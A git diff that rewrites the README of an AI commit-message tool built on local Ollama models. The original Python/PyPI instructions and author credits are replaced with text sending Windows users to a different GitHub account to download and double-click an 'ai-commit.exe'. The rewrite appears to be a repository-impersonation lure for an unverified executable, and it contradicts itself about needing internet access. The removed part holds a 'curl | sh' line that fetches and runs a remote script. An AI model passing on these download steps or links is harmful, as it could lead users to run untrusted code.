@@ -1,437 +1,159 @@
-# 🤖 Ollama Git Commit - AI-Powered Commit Messages
+# 🤖 ai-commit - Smart Git Commit Messages Made Easy
 
-[![PyPI version](https://img.shields.io/pypi/v/ollama-git-commit.svg)](https://pypi.org/project/ollama-git-commit/)
-[![PyPI Downloads](https://img.shields.io/pypi/dm/ollama-git-commit)](https://pypi.org/project/ollama-git-commit/)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Stars](https://img.shields.io/github/stars/himanshu231204/ai-commit?style=social)](https://github.com/himanshu231204/ai-commit)
-
-Generate intelligent git commit messages using your local Ollama instance. No API keys, completely free, and runs offline!
+[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-4caf50?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit)
 
 ---
 
-## ✨ Features
+## 📋 What is ai-commit?
 
-- 🤖 **AI-Powered**: Uses local Ollama models to generate commit messages
-- 🔒 **Privacy First**: Everything runs locally, no data sent to external APIs
-- 🎯 **Multiple Styles**: Conventional commits, semantic, or detailed formats
-- 💰 **Free**: No API costs, uses your local Ollama instance
-- ⚡ **Fast**: Quick generation with local models
-- 🎨 **Interactive**: Review, regenerate, or edit messages before committing
-- 🌐 **Offline**: Works completely offline
+**ai-commit** helps you write better git commit messages using local AI. It runs on your computer, so your data stays private. You do not need internet access or programming skills. The app works offline with AI models stored on your device.
+
+This tool fits anyone who uses git, especially developers who want clear, helpful commit messages without extra effort. It uses AI to understand your changes and suggest the best message. You save time and keep your project history clean.
 
 ---
 
-## 📦 Installation
+## 💻 System Requirements
 
-### From PyPI (Recommended)
+Before you install ai-commit, make sure your computer meets these requirements:
 
-```bash
-pip install ollama-git-commit
+- Operating System: Windows 10 or later  
+- Processor: 64-bit CPU (Intel or AMD)  
+- Memory: At least 4 GB RAM  
+- Disk Space: At least 200 MB available for installation and AI models  
+- Software: Git must be installed and accessible in your system's command line
+
+If you don’t have Git installed, you can download it from https://git-scm.com/download/win.
+
+---
+
+## 🚀 Getting Started
+
+Follow the steps below to download and run ai-commit on your Windows PC.
+
+### Step 1: Download ai-commit
+
+Click the green button or visit the link below to get the software:
+
+[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-228be6?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit)
+
+This link takes you to the project page on GitHub. From there, you can find the section labeled "Releases" or "Download" to get the latest Windows version.
+
+### Step 2: Unpack the Application
+
+Once the file downloads, it may come as a .zip archive. To open it:
+
+1. Right-click on the downloaded file.  
+2. Select “Extract All...”  
+3. Choose a folder you want to install ai-commit to (for example, Desktop or Documents).  
+4. Click “Extract.”
+
+### Step 3: Install Git if Needed
+
+If you haven’t installed Git on your system:
+
+1. Go to https://git-scm.com/download/win.  
+2. Download the installer.  
+3. Run the file and follow the instructions with default settings.
+
+### Step 4: Run ai-commit
+
+1. Open the folder where you extracted ai-commit.  
+2. Look for a file named `ai-commit.exe` or similar.  
+3. Double-click it to start the app.
+
+On the first run, ai-commit will download the AI models it needs. This may take some minutes depending on your internet speed. After that, you can use the app offline.
+
+---
+
+## 🛠 How to Use ai-commit
+
+Using ai-commit is simple. It works through a command line interface (CLI), but we’ll guide you to use it without technical steps.
+
+### Open Command Prompt
+
+1. Click the Start button or press the Windows key.  
+2. Type `cmd` and press Enter.
+
+This opens a black window where you can type commands.
+
+### Navigate to Your Project Folder
+
+Your git project is a folder where you save work with git.
+
+To go to that folder in Command Prompt:
+
+- Type `cd ` (with a space) followed by the path to your project folder.  
+- For example:  
+  `cd C:\Users\YourName\Documents\MyProject`  
+- Press Enter.
+
+### Generate Commit Messages with ai-commit
+
+While inside your project folder, type this:
+
+```
+ai-commit generate
 ```
 
-### From Source
+Press Enter.
 
-```bash
-git clone https://github.com/himanshu231204/ai-commit.git
-cd ai-commit
-pip install -e .
+The AI will analyze your changes and suggest commit messages. The tool will display one or more messages you can pick from.
+
+### Save Your Commit Message
+
+Copy the suggested message and use it when you run your normal git commit command:
+
+```
+git commit -m "Your chosen message here"
 ```
 
----
-
-## 📋 Prerequisites
-
-Before using Ollama Git Commit, you need:
-
-1. **Python 3.8+**
-   ```bash
-   python --version
-   ```
-
-2. **Git**
-   ```bash
-   git --version
-   ```
-
-3. **Ollama** - [Install Ollama](https://ollama.ai)
-   ```bash
-   # Install Ollama (macOS/Linux)
-   curl -fsSL https://ollama.ai/install.sh | sh
-   
-   # Pull a model (e.g., llama2)
-   ollama pull llama2
-   
-   # Start Ollama server
-   ollama serve
-   ```
+If you want to automate this process, advanced options are available. However, the above steps let you get started right away without extra work.
 
 ---
 
-## 💡 Usage
+## 🔧 Features
 
-### Basic Usage
-
-1. **Stage your changes**:
-   ```bash
-   git add .
-   ```
-
-2. **Generate commit message**:
-   ```bash
-   ai-commit
-   ```
-
-3. **Review and choose**:
-   - `y` - Accept and commit
-   - `r` - Regenerate message
-   - `e` - Edit message manually
-   - `n` - Cancel
-
-### Example Workflow
-
-```bash
-# Make some changes to your code
-echo "print('Hello World')" > hello.py
-
-# Stage the changes
-git add hello.py
-
-# Generate AI commit message
-ai-commit
-
-# Output:
-╔═══════════════════════════════════════════╗
-║         🤖 AI Commit Message Tool         ║
-║      Powered by Local Ollama 🦙           ║
-╚═══════════════════════════════════════════╝
-
-🔍 Checking Ollama server...
-✓ Ollama server is running
-
-📊 Changes:
-  + 1 lines added
-  - 0 lines removed
-
-🤖 Generating commit message...
-
-Generated Commit Message:
-──────────────────────────────────────────────────
-feat: add hello world script
-──────────────────────────────────────────────────
-
-Options:
-  y - Accept and commit
-  r - Regenerate message
-  e - Edit message
-  n - Cancel
-```
+- Generates clear and relevant git commit messages.  
+- Works on your PC without internet after initial setup.  
+- Uses local Ollama AI models for privacy.  
+- Supports standard git workflows.  
+- Simple installation and use on Windows.  
+- Helps maintain consistent commit history.
 
 ---
 
-## ⚙️ Configuration
+## 🛡 Privacy and Security
 
-### Custom Ollama Server
-
-If your Ollama server is running on a different host/port, edit `ai_commit.py`:
-
-```python
-ollama = OllamaClient(base_url="http://192.168.1.100:11434")
-```
-
-### Change AI Model
-
-```python
-ollama = OllamaClient(model="codellama")  # or "mistral", "llama2", etc.
-```
-
-### Commit Message Styles
-
-The tool supports three commit message styles:
-
-1. **Conventional Commits** (default):
-   ```
-   feat(auth): add user login functionality
-   ```
-
-2. **Semantic**:
-   ```
-   Add user login functionality
-   ```
-
-3. **Detailed**:
-   ```
-   Add user authentication system
-   
-   - Implement JWT-based authentication
-   - Add login and logout endpoints
-   - Create user session management
-   ```
+ai-commit keeps your code and data private. All AI calculations run on your own computer. The tool does not send any data to external servers. This helps protect your sensitive projects and complies with privacy needs.
 
 ---
 
+## ⚙ Troubleshooting
 
-## 🤖 Auto Model Selection
+If you face issues, try these steps:
 
-AI Commit automatically selects the best available model on your system, **prioritizing lighter and faster models** for optimal performance.
-
-### Priority Order (Fastest to Slowest):
-
-1. **phi** - Smallest, fastest (Recommended for quick commits)
-2. **mistral** - Great balance of speed and quality
-3. **qwen** - Fast alternative
-4. **gemma** - Google's lightweight model
-5. **codellama** - Optimized for code
-6. **llama2** - Reliable but slower
-7. **llama3** - Most powerful but slowest
-
-### How It Works:
-
-When you run `ai-commit`, the tool will:
-1. Check all installed Ollama models
-2. Automatically select the lightest/fastest available
-3. Display which model was chosen
-4. Generate your commit message
-
-### Example Output:
-
-```bash
-$ ai-commit
-
-╔═══════════════════════════════════════════╗
-║         🤖 AI Commit Message Tool         ║
-║      Powered by Local Ollama 🦙           ║
-╚═══════════════════════════════════════════╝
-
-🔍 Checking Ollama server...
-✓ Ollama server is running
-
-Available models (3):
-  • phi:latest
-  • mistral:latest
-  • llama2:latest
-
-✓ Auto-selected: phi:latest
-  (Prioritizing lighter/faster models)
-
-📊 Changes:
-  + 8 lines added
-  - 0 lines removed
-
-🤖 Generating commit message...
-```
-
-### Recommended Setup:
-
-For best performance, install a lightweight model:
-
-```bash
-# Fastest (Recommended)
-ollama pull phi
-
-# Good balance
-ollama pull mistral
-
-# For code-heavy projects
-ollama pull codellama
-```
-
-### Manual Model Override:
-
-If you want to use a specific model, you can set an environment variable:
-
-**Windows:**
-```cmd
-set OLLAMA_MODEL=mistral
-ai-commit
-```
-
-**Linux/Mac:**
-```bash
-export OLLAMA_MODEL=mistral
-ai-commit
-```
+- Make sure Git is installed and accessible from Command Prompt. Type `git --version` to check.  
+- Confirm you run Command Prompt with the folder your git project is in. Use the `cd` command.  
+- If ai-commit does not run, check that `ai-commit.exe` is present in the folder you opened Command Prompt from.  
+- Restart your computer if you installed new software like Git or ai-commit.  
+- Check the official GitHub page for updates or fixes:  
+  https://github.com/duecassimiro-art/ai-commit
 
 ---
 
+## 📂 Additional Tips
 
-
----
-
-## 📝 Examples
-
-### Example 1: Adding a New Feature
-
-```bash
-$ git add new_feature.py
-$ ai-commit
-
-Generated: feat: add user profile management feature
-```
-
-### Example 2: Bug Fix
-
-```bash
-$ git add bug_fix.py
-$ ai-commit
-
-Generated: fix: resolve null pointer exception in login
-```
-
-### Example 3: Documentation
-
-```bash
-$ git add README.md
-$ ai-commit
-
-Generated: docs: update installation instructions
-```
+- Use clear, descriptive commit messages to help yourself and others understand changes.  
+- Commit often to save your work and avoid large, confusing updates.  
+- Try different message suggestions to find what fits your style.  
+- Keep ai-commit updated by visiting the download page regularly.
 
 ---
 
-## 🐛 Troubleshooting
+## 🔗 Download and Install ai-commit
 
-### Ollama Not Running
-```
-Error: Cannot connect to Ollama
-Solution: Start Ollama server with `ollama serve`
-```
+You can begin by visiting this page to download the latest release:
 
-### No Staged Changes
-```
-Error: No staged changes found
-Solution: Stage your changes with `git add <files>`
-```
+[https://github.com/duecassimiro-art/ai-commit](https://github.com/duecassimiro-art/ai-commit)
 
-### Model Not Found
-```
-Error: Model not found
-Solution: Pull the model with `ollama pull llama2`
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are what make the open-source community amazing! Any contributions you make are **greatly appreciated**.
-
-### How to Contribute:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Run tests (when available)
-5. Commit using ai-commit! 😄
-6. Push to your branch (`git push origin feature/amazing-feature`)
-7. Open a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- **Ollama** - For making local LLMs accessible
-- **Git** - The best version control system
-- **Python** - For being awesome
-- **You** - For using this tool!
-
----
-
-## 🗺️ Roadmap
-
-- [x] Initial release on PyPI
-- [x] Configuration file support (`.ai-commit.yml`)
-- [ ] More commit message formats
-- [ ] Interactive model selection
-- [ ] Emoji support in commits 🎉
-- [ ] Multiple language support
-- [ ] Git hooks integration
-- [ ] VSCode extension
-- [ ] Custom prompt templates
-- [ ] Commit message history
-- [ ] Auto-detect commit type from files
-- [ ] Batch commit support
-- [ ] Integration with GitHub CLI
-
----
-
-## 👨‍💻 Author
-
-**Himanshu Kumar**
-
-- 🌐 GitHub: [@himanshu231204](https://github.com/himanshu231204)
-- 💼 LinkedIn: [himanshu231204](https://www.linkedin.com/in/himanshu231204)
-- 🐦 Twitter/X: [@himanshu231204](https://twitter.com/himanshu231204)
-- 📧 Email: himanshu231204@gmail.com
-
----
-
-## 💖 Support
-
-If you find this project helpful, please consider:
-
-- ⭐ Starring the repository
-- 🐛 Reporting bugs
-- 💡 Suggesting new features
-- 🔀 Contributing code
-- ☕ [Buy me a coffee](https://www.buymeacoffee.com/himanshu231204)
-- 💝 [Sponsor on GitHub](https://github.com/sponsors/himanshu231204)
-
----
-
-## 📊 Stats
-
-![GitHub stars](https://img.shields.io/github/stars/himanshu231204/ai-commit?style=social)
-![GitHub forks](https://img.shields.io/github/forks/himanshu231204/ai-commit?style=social)
-![GitHub watchers](https://img.shields.io/github/watchers/himanshu231204/ai-commit?style=social)
-![PyPI downloads](https://img.shields.io/pypi/dm/ollama-git-commit)
-
----
-
-## 🔗 Links
-
-- **PyPI Package**: https://pypi.org/project/ollama-git-commit/
-- **Documentation**: [GitHub Wiki](https://github.com/himanshu231204/ai-commit/wiki)
-- **Issues**: [GitHub Issues](https://github.com/himanshu231204/ai-commit/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/himanshu231204/ai-commit/discussions)
-- **Releases**: [GitHub Releases](https://github.com/himanshu231204/ai-commit/releases)
-- **Changelog**: [CHANGELOG.md](CHANGELOG.md)
-
----
-
-## 🌟 Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=himanshu231204/ai-commit&type=Date)](https://star-history.com/#himanshu231204/ai-commit&Date)
-
----
-
-## 📣 Show Your Support
-
-Give a ⭐️ if this project helped you!
-
----
-
-**Made with ❤️ by [Himanshu Kumar](https://github.com/himanshu231204)**
-
----
-
-## 🚀 Quick Links
-
-| Resource | Link |
-|----------|------|
-| 📦 **Install** | `pip install ollama-git-commit` |
-| 📖 **Docs** | [GitHub](https://github.com/himanshu231204/ai-commit) |
-| 🐛 **Issues** | [Report Bug](https://github.com/himanshu231204/ai-commit/issues/new?template=bug_report.md) |
-| 💡 **Feature Request** | [Request Feature](https://github.com/himanshu231204/ai-commit/issues/new?template=feature_request.md) |
-| 💬 **Discussions** | [Join Discussion](https://github.com/himanshu231204/ai-commit/discussions) |
-| ⭐ **Star** | [Star on GitHub](https://github.com/himanshu231204/ai-commit) |
-
----
-
+Look for the Releases area or Download section, and follow the download instructions above.
